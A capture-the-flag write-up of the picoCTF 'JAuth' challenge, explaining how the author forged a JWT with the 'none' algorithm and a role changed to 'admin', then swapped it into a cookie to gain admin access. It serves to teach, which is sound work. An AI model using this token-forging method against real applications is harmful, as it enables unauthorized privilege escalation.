

---

## JAuth – PicoCTF Challenge Writeup

**Author:** Geoffrey Njogu

---

### Challenge Description

Most web application developers use third-party components without testing their security. Some well-known breaches that resulted from this include:

* **Equifax** – due to an unpatched Apache Struts vulnerability (CVE-2017-5638)
* **Mossack Fonseca (Panama Papers)** – breached via an unpatched Drupal CMS
* **VerticalScope** – used an outdated version of vBulletin

The challenge was hosted [here](http://saturn.picoctf.net:55824) and asked:

> Can you identify the components and exploit the vulnerable one? Can you become an admin?

We were given test credentials:
**Username:** `test`
**Password:** `Test123!`

---

### My Approach

This challenge hinted heavily at insecure use of web components. On logging in with the test credentials, I immediately checked for any client-side tokens or session identifiers. Using **Firefox's Developer Tools**, I found a cookie named `token`, which appeared to be a **JWT (JSON Web Token)**—structured as three base64-encoded strings separated by dots.

The hint in the problem also mentioned the JWT having exactly two periods, reinforcing that the token was likely important.

---

### Inspecting the JWT

Using [token.dev](https://token.dev), I decoded the JWT:

**Header**

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**Payload**

```json
{
  "auth": 1688308967209,
  "agent": "Mozilla/5.0 (...Firefox...)",
  "role": "user",
  "iat": 1688308967
}
```

The key detail here was that the `role` was set to `"user"`. That made me suspect the backend logic was checking this field for access control. The `alg` (algorithm) field was set to `HS256`, meaning the signature should be verified with a secret key—unless the backend implementation was flawed.

---

### Exploiting Algorithm Confusion

There's a known vulnerability called **JWT algorithm confusion**, where if the server doesn't strictly enforce signature verification, we can switch the algorithm to `"none"` and strip the signature.

I modified the token using token.dev:

**Header**

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

**Payload**

```json
{
  "auth": 1688308967209,
  "agent": "Mozilla/5.0 (...Firefox...)",
  "role": "admin",
  "iat": 1688308967
}
```

I then re-encoded the header and payload using base64 and constructed a JWT with no signature, just a trailing dot:

```
<base64_header>.<base64_payload>.
```

---

### Gaining Admin Access

Back in Firefox, I manually edited the `token` cookie and replaced its value with the modified JWT. On refreshing the page, I was now logged in as an **admin**—and the **flag was displayed**.

---

![image](https://github.com/user-attachments/assets/d541c498-42dc-4da1-8c6a-bd1f70f7b281)
![image](https://github.com/user-attachments/assets/ac1ce59a-d3fe-4cfc-8847-33dd8816af7d)

